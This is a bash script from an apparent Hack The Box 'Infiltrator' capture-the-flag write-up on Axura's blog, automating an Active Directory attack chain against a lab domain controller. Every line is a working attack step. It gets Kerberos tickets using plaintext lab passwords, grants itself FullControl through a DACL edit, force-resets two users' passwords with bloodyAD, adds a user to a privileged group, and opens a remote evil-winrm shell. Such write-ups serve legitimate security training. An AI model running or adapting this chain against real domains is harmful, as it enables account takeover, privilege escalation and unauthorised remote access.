# For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.
# License: CC BY-NC-SA 4.0
# Author: Axura
# URL: https://4xura.com/ctf/htb/htb-writeup-infiltrator/
# Source: Axura's Blog

echo "[*] Set up dc-ip parameter..."
dcip=10.10.11.31

echo "[*] Getting d.anderson TGT ticket."
impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip $dcip

echo "[!] Write DACL to FullControl."
export KRB5CCNAME=d.anderson.ccache
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip $dcip

echo "[!] Change e.rodriguez password as \"whoami?Axura123\" with GenericAll right from d.anderson."
python3 /home/yasser/Desktop/ctf/htb/infiltrator/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "d.anderson" -p "WAT?watismypass!" set password "e.rodriguez" "whoami?Axura123"

echo "[*] Getting e.rodriguez's TGT ticket."
impacket-getTGT infiltrator.htb/"e.rodriguez":"whoami?Axura123" -dc-ip $dcip

echo "[*] Add e.rodriguez to CHIEFS MARKETING group via AddSelf privilege."
export KRB5CCNAME=e.rodriguez.ccache
python3 /home/yasser/Desktop/ctf/htb/infiltrator/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --dc-ip $dcip -u e.rodriguez -k add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez

echo "[!] Change password for m.harris to \"whoami?Axura456\" via ForceChangePassword priv"
python3 /home/yasser/Desktop/ctf/htb/infiltrator/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip $dcip -u "e.rodriguez" -p "whoami?Axura123" set password "m.harris" "whoami?Axura456"

echo "[*] Getting m.harris's TGT ticket."
impacket-getTGT infiltrator.htb/m.harris:'whoami?Axura456'

echo "[!] Get the session using m.harris's ticket via CanPsRemote priv"
KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -u "m.harris" -r INFILTRATOR.HTB
